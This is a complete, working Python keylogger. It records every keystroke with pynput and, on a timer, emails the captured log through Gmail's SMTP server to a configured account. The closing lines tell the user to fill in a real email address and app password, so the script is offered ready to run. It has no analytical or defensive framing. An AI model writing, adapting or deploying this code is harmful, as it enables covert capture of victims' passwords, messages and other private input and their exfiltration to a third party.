#!/usr/bin/env python3
import pynput.keyboard as keyboard
import threading
import smtplib

class Keylogger:
    def __init__(self, time_interval, email, password):
        self.log = "[+] Keylogger started.\n"
        self.interval = time_interval
        self.email = email
        self.password = password

    def append_to_log(self, string):
        self.log += string

    def process_key_press(self, key):
        try:
            current_key = str(key.char)
        except AttributeError:
            if key == key.space:
                current_key = " "
            elif key == key.enter:
                current_key = "\n"
            else:
                current_key = f"[{key}]"
        self.append_to_log(current_key)

    def send_email(self, email, password, message):
        try:
            server = smtplib.SMTP("smtp.gmail.com", 587)
            server.starttls()
            server.login(email, password)
            server.sendmail(email, email, message)
            server.quit()
        except Exception as e:
            print(f"[!] Failed to send email: {e}")

    def report(self):
        if self.log.strip():
            print(self.log)
            self.send_email(self.email, self.password, "\n\n" + self.log)
            self.log = ""
        timer = threading.Timer(self.interval, self.report)
        timer.daemon = True
        timer.start()

    def start(self):
        keyboard_listener = keyboard.Listener(on_press=self.process_key_press)
        with keyboard_listener:
            self.report()
            keyboard_listener.join()

# Replace with real email and app-specific password (for Gmail, generate it in Google Account > Security)
keylogger = Keylogger(120, "youremail@gmail.com", "your_app_password")
keylogger.start()
